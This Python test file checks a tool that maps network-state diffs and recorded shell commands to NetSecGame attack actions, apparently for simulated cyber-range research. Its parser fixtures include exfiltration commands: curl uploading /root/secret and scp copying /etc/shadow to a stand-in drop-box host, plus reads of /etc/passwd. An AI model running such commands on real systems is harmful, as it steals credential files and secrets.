"""Tests for NSG-level diffing and effect/command labelling."""

import unittest

from netsecgame.game_components import Action, ActionType, Data, GameState, IP, Network, Service

from nsg_surrogate import candidates
from nsg_surrogate.labeling import (
    CommandFacts,
    Label,
    label_transition,
    merge_labels,
    parse_command,
)
from nsg_surrogate.state_adapter import Provenance
from nsg_surrogate.state_diff import diff_states, lost_knowledge

LOCAL = IP("10.0.0.5")
TARGET = IP("10.0.0.9")
DROP_BOX = IP("203.0.113.9")
NET = Network("10.0.0.0", 24)
SSH = Service("ssh", "tcp", "unknown", False)
HTTP = Service("http", "tcp", "unknown", False)
SECRET = Data(owner="10.0.0.9", id="/root/secret", size=0, type="file", content="")


def base_state(**overrides) -> GameState:
    defaults = dict(
        controlled_hosts={LOCAL},
        known_hosts={LOCAL},
        known_services={},
        known_data={},
        known_networks={NET},
        known_blocks={},
    )
    defaults.update(overrides)
    return GameState(**defaults)


def provenance() -> Provenance:
    prov = Provenance()
    prov.local_hosts.add(LOCAL)
    return prov


def label_types(result) -> set:
    return {label.action.type for label in result.labels}


class DiffTests(unittest.TestCase):
    def test_new_host_and_service(self):
        before = base_state()
        after = base_state(known_hosts={LOCAL, TARGET}, known_services={TARGET: {SSH}})
        diff = diff_states(before, after)
        self.assertEqual(diff.new_hosts, {TARGET})
        self.assertEqual(diff.new_services, {TARGET: frozenset({SSH})})
        self.assertEqual(
            diff.changed_categories, ("known_hosts", "known_services")
        )

    def test_relocated_data_is_not_counted_as_new(self):
        before = base_state(known_hosts={LOCAL, TARGET}, known_data={TARGET: {SECRET}})
        after = base_state(
            known_hosts={LOCAL, TARGET},
            controlled_hosts={LOCAL, DROP_BOX},
            known_data={TARGET: {SECRET}, DROP_BOX: {SECRET}},
        )
        diff = diff_states(before, after)
        self.assertEqual(diff.new_data, {})
        self.assertEqual(diff.relocated_data, ((SECRET, TARGET, DROP_BOX),))

    def test_empty_diff(self):
        state = base_state()
        self.assertTrue(diff_states(state, state).empty)

    def test_lost_knowledge_is_reported_separately(self):
        before = base_state(known_hosts={LOCAL, TARGET}, known_services={TARGET: {SSH, HTTP}})
        after = base_state(known_hosts={LOCAL, TARGET}, known_services={TARGET: {SSH}})
        self.assertTrue(diff_states(before, after).empty)
        self.assertEqual(lost_knowledge(before, after)["services"], 1)


class EffectLabelTests(unittest.TestCase):
    def test_new_host_labels_a_scan_of_its_network(self):
        before = base_state()
        after = base_state(known_hosts={LOCAL, TARGET})
        result = label_transition(
            before, after, diff_states(before, after), provenance=provenance()
        )
        self.assertEqual(len(result.labels), 1)
        label = result.labels[0]
        self.assertEqual(label.action.type, ActionType.ScanNetwork)
        self.assertEqual(label.action.parameters["target_network"], NET)
        self.assertEqual(label.action.parameters["source_host"], LOCAL)
        self.assertEqual(label.label_source, "effect")

    def test_matching_command_upgrades_the_label_source(self):
        before = base_state()
        after = base_state(known_hosts={LOCAL, TARGET})
        commands = [
            parse_command({"command": {"argv": ["nmap", "-sn", "10.0.0.0/24"], "executable": "nmap"}})
        ]
        result = label_transition(
            before, after, diff_states(before, after), commands=commands, provenance=provenance()
        )
        self.assertEqual(result.labels[0].label_source, "effect+command")
        self.assertGreater(result.labels[0].confidence, 0.8)

    def test_new_services_label_findservices_on_that_host(self):
        before = base_state(known_hosts={LOCAL, TARGET})
        after = base_state(known_hosts={LOCAL, TARGET}, known_services={TARGET: {SSH}})
        result = label_transition(
            before, after, diff_states(before, after), provenance=provenance()
        )
        self.assertEqual(label_types(result), {ActionType.FindServices})
        self.assertEqual(result.labels[0].action.parameters["target_host"], TARGET)

    def test_new_control_labels_an_exploit_of_a_known_service(self):
        before = base_state(known_hosts={LOCAL, TARGET}, known_services={TARGET: {HTTP, SSH}})
        after = base_state(
            known_hosts={LOCAL, TARGET},
            controlled_hosts={LOCAL, TARGET},
            known_services={TARGET: {HTTP, SSH}},
        )
        commands = [parse_command({"command": {"argv": ["ssh", "root@10.0.0.9"], "executable": "ssh"}})]
        result = label_transition(
            before, after, diff_states(before, after), commands=commands, provenance=provenance()
        )
        self.assertEqual(label_types(result), {ActionType.ExploitService})
        # The executable names the service, so the canonical fallback is not used.
        self.assertEqual(result.labels[0].action.parameters["target_service"], SSH)
        self.assertEqual(result.labels[0].notes, ())

    def test_exploited_service_falls_back_to_canonical_with_a_note(self):
        before = base_state(known_hosts={LOCAL, TARGET}, known_services={TARGET: {HTTP, SSH}})
        after = base_state(
            known_hosts={LOCAL, TARGET},
            controlled_hosts={LOCAL, TARGET},
            known_services={TARGET: {HTTP, SSH}},
        )
        result = label_transition(
            before, after, diff_states(before, after), provenance=provenance()
        )
        label = result.labels[0]
        self.assertEqual(label.action.parameters["target_service"], HTTP)  # lexicographic
        self.assertTrue(any("canonical service" in note for note in label.notes))

    def test_relocated_data_labels_exfiltration(self):
        local_secret = Data(owner="10.0.0.5", id="/root/secret", size=0, type="file", content="")
        before = base_state(
            controlled_hosts={LOCAL, DROP_BOX},
            known_hosts={LOCAL, TARGET, DROP_BOX},
            known_data={LOCAL: {local_secret}},
        )
        after = base_state(
            controlled_hosts={LOCAL, DROP_BOX},
            known_hosts={LOCAL, TARGET, DROP_BOX},
            known_data={LOCAL: {local_secret}, DROP_BOX: {local_secret}},
        )
        result = label_transition(
            before, after, diff_states(before, after), provenance=provenance()
        )
        self.assertEqual(label_types(result), {ActionType.ExfiltrateData})
        action = result.labels[0].action
        self.assertEqual(action.parameters["source_host"], LOCAL)
        self.assertEqual(action.parameters["target_host"], DROP_BOX)


class UnmappableTests(unittest.TestCase):
    """Each category names a NetSecGame capability that does not exist."""

    def categories(self, before, after, **kwargs):
        result = label_transition(
            before, after, diff_states(before, after), provenance=provenance(), **kwargs
        )
        return {item.category for item in result.unmappable}, result

    def test_host_learned_outside_any_known_network(self):
        before = base_state()
        after = base_state(known_hosts={LOCAL, IP("8.8.8.8")})
        found, result = self.categories(before, after)
        self.assertIn("host discovered outside any known network", found)
        self.assertEqual(result.labels, [])

    def test_control_without_prior_service_knowledge(self):
        before = base_state(known_hosts={LOCAL, TARGET})
        after = base_state(known_hosts={LOCAL, TARGET}, controlled_hosts={LOCAL, TARGET})
        found, _ = self.categories(before, after)
        self.assertIn("control gained without prior service knowledge", found)

    def test_services_on_a_host_learned_in_the_same_transition(self):
        before = base_state()
        after = base_state(known_hosts={LOCAL, TARGET}, known_services={TARGET: {SSH}})
        found, _ = self.categories(before, after)
        self.assertIn("services learned on a previously unknown host", found)

    def test_data_on_an_uncontrolled_host(self):
        before = base_state(known_hosts={LOCAL, TARGET})
        after = base_state(known_hosts={LOCAL, TARGET}, known_data={TARGET: {SECRET}})
        found, _ = self.categories(before, after)
        self.assertIn("data learned on an uncontrolled host", found)

    def test_off_vocabulary_command(self):
        state = base_state()
        commands = [
            parse_command({"command": {"argv": ["apt-get", "install", "vim"], "executable": "apt-get"}})
        ]
        found, _ = self.categories(state, state, commands=commands)
        self.assertIn("command outside the NSG action vocabulary", found)

    def test_no_controlled_host_at_all(self):
        empty = GameState(known_networks={NET})
        found, result = self.categories(empty, empty)
        self.assertIn("no controlled source host", found)
        self.assertEqual(result.labels, [])


class CommandOnlyLabelTests(unittest.TestCase):
    def test_local_read_is_attributed_to_the_acting_host(self):
        """`cat` on the container must not be attributed to the drop box."""
        state = base_state(
            controlled_hosts={LOCAL, DROP_BOX}, known_hosts={LOCAL, DROP_BOX}
        )
        commands = [
            parse_command({"command": {"argv": ["cat", "/etc/passwd"], "executable": "cat"}})
        ]
        result = label_transition(
            state, state, diff_states(state, state), commands=commands, provenance=provenance()
        )
        self.assertEqual(len(result.labels), 1)
        action = result.labels[0].action
        self.assertEqual(action.type, ActionType.FindData)
        self.assertEqual(action.parameters["target_host"], LOCAL)
        self.assertEqual(result.labels[0].label_source, "command")
        self.assertTrue(any("no NSG-visible state change" in n for n in result.labels[0].notes))

    def test_repeated_commands_collapse_into_one_label(self):
        state = base_state()
        commands = [
            parse_command({"command": {"argv": ["cat", "/etc/passwd"], "executable": "cat"}}),
            parse_command({"command": {"argv": ["/usr/bin/cat", "/etc/passwd"], "executable": "/usr/bin/cat"}}),
        ]
        result = label_transition(
            state, state, diff_states(state, state), commands=commands, provenance=provenance()
        )
        self.assertEqual(len(result.labels), 1)
        self.assertEqual(
            len(result.labels[0].evidence.get("grounded_commands", [])), 2
        )


class CommandParsingTests(unittest.TestCase):
    def test_nmap_flags_disambiguate_scan_from_service_probe(self):
        discovery = parse_command({"command": {"argv": ["nmap", "-sn", "10.0.0.0/24"], "executable": "nmap"}})
        self.assertEqual(discovery.action_types, frozenset({ActionType.ScanNetwork}))
        self.assertEqual(discovery.cidrs, ("10.0.0.0/24",))

        probe = parse_command({"command": {"argv": ["nmap", "-p22,443", "10.0.0.9"], "executable": "nmap"}})
        self.assertEqual(probe.action_types, frozenset({ActionType.FindServices}))
        self.assertEqual(probe.ips, ("10.0.0.9",))
        self.assertEqual(probe.ports, (22, 443))

    def test_curl_only_counts_as_exfiltration_when_uploading(self):
        download = parse_command({"command": {"argv": ["curl", "http://10.0.0.9/"], "executable": "curl"}})
        self.assertNotIn(ActionType.ExfiltrateData, download.action_types)

        upload = parse_command(
            {"command": {"argv": ["curl", "-T", "/root/secret", "http://203.0.113.9/"], "executable": "curl"}}
        )
        self.assertIn(ActionType.ExfiltrateData, upload.action_types)
        self.assertIn("/root/secret", upload.paths)

    def test_ssh_port_flag(self):
        facts = parse_command({"command": {"argv": ["ssh", "-p", "2222", "root@10.0.0.9"], "executable": "ssh"}})
        self.assertEqual(facts.ports, (2222,))

    def test_record_without_argv(self):
        self.assertIsNone(parse_command({"command": {}}))


class CandidateGateTests(unittest.TestCase):
    def test_action_identity_ignores_parameter_order(self):
        """Regression: `to_json` is insertion-ordered, so it cannot compare actions."""
        one = Action(ActionType.FindServices, {"source_host": LOCAL, "target_host": TARGET})
        other = Action(ActionType.FindServices, {"target_host": TARGET, "source_host": LOCAL})
        self.assertNotEqual(one.to_json(), other.to_json())
        self.assertEqual(candidates.action_key(one), candidates.action_key(other))
        self.assertTrue(candidates.contains([one], other))

    def test_exfiltration_from_an_uncontrolled_host_is_not_a_candidate(self):
        """Knowing where data is is not being able to take it.

        NSG's own `generate_valid_actions` emits this action; the game will not
        execute it, so `enumerate_actions` corrects the generator by default.
        """
        state = base_state(known_hosts={LOCAL, TARGET}, known_data={TARGET: {SECRET}})
        raw = candidates.enumerate_actions(state, require_controlled_exfil_source=False)
        corrected = candidates.enumerate_actions(state)

        raw_exfil = [a for a in raw if a.type == ActionType.ExfiltrateData]
        self.assertEqual(len(raw_exfil), 1, "upstream generator emits it")
        self.assertEqual(raw_exfil[0].parameters["source_host"], TARGET)
        self.assertEqual(
            [a for a in corrected if a.type == ActionType.ExfiltrateData],
            [],
            "the corrected candidate set excludes it",
        )

    def test_data_moving_off_an_uncontrolled_host_is_unmappable(self):
        before = base_state(known_hosts={LOCAL, TARGET}, known_data={TARGET: {SECRET}})
        after = base_state(
            known_hosts={LOCAL, TARGET}, known_data={TARGET: {SECRET}, LOCAL: {SECRET}}
        )
        result = label_transition(
            before, after, diff_states(before, after), provenance=provenance()
        )
        self.assertEqual(result.labels, [])
        self.assertIn(
            "data moved from an uncontrolled host",
            {item.category for item in result.unmappable},
        )

    def test_blind_exfiltration_is_recorded_as_unmappable(self):
        """`scp /etc/shadow` from a controlled host, with no prior FindData."""
        state = base_state(controlled_hosts={LOCAL, DROP_BOX}, known_hosts={LOCAL, DROP_BOX})
        commands = [
            parse_command(
                {
                    "command": {
                        "argv": ["scp", "/etc/shadow", "root@203.0.113.9:/loot/"],
                        "executable": "scp",
                    }
                }
            )
        ]
        result = label_transition(
            state, state, diff_states(state, state), commands=commands, provenance=provenance()
        )
        categories = {item.category for item in result.unmappable}
        self.assertIn("blind exfiltration of undiscovered data", categories)


class TranslatorRoundTripTests(unittest.TestCase):
    """The forward and inverse command mappings must agree where they overlap.

    `nsg-action-translator` owns the forward direction (NSG action -> CommandPlan
    -> argv); this repo owns the inverse (argv + effect -> NSG action). If the
    inverse cannot recover the action type from the exact argv the translator
    emits, then a trajectory recorded while an NSG agent was driving the range
    would be unlabelable — the two halves of the loop would disagree.

    argv shapes are copied from
    `nsg_action_translator/actions/translator.py:67-83` rather than imported, to
    keep the test independent of that repo's layout. Update them if it changes.
    """

    def recovered_type(self, argv):
        facts = parse_command({"command": {"argv": list(argv), "executable": argv[0]}})
        return facts.action_types

    def test_scan_network_plan_is_recovered(self):
        argv = (
            "nmap", "-sn", "--max-retries", "1", "--host-timeout", "10s",
            "-oX", "-", "--", "10.0.0.0/24",
        )
        self.assertEqual(self.recovered_type(argv), frozenset({ActionType.ScanNetwork}))

    def test_find_services_plan_is_recovered(self):
        argv = (
            "nmap", "-sV", "--version-light", "--max-retries", "1",
            "--host-timeout", "60s", "-oX", "-", "--", "10.0.0.9",
        )
        self.assertEqual(self.recovered_type(argv), frozenset({ActionType.FindServices}))

    def test_scan_plan_grounds_back_to_the_action_that_produced_it(self):
        """Full round trip: the recovered label equals the original action."""
        original = Action(
            ActionType.ScanNetwork, {"source_host": LOCAL, "target_network": NET}
        )
        before = base_state()
        after = base_state(known_hosts={LOCAL, TARGET})
        commands = [
            parse_command(
                {
                    "command": {
                        "argv": ["nmap", "-sn", "-oX", "-", "--", "10.0.0.0/24"],
                        "executable": "nmap",
                    }
                }
            )
        ]
        result = label_transition(
            before, after, diff_states(before, after), commands=commands,
            provenance=provenance(),
        )
        self.assertEqual(len(result.labels), 1)
        self.assertEqual(
            candidates.action_key(result.labels[0].action), candidates.action_key(original)
        )
        self.assertEqual(result.labels[0].label_source, "effect+command")


class MergeLabelTests(unittest.TestCase):
    def test_highest_confidence_wins_and_notes_merge(self):
        action = Action(ActionType.FindServices, {"source_host": LOCAL, "target_host": TARGET})
        merged = merge_labels(
            [
                Label(action=action, label_source="command", confidence=0.5, notes=("a",)),
                Label(action=action, label_source="effect", confidence=0.9, notes=("b",)),
            ]
        )
        self.assertEqual(len(merged), 1)
        self.assertEqual(merged[0].confidence, 0.9)
        self.assertEqual(set(merged[0].notes), {"a", "b"})


if __name__ == "__main__":
    unittest.main()
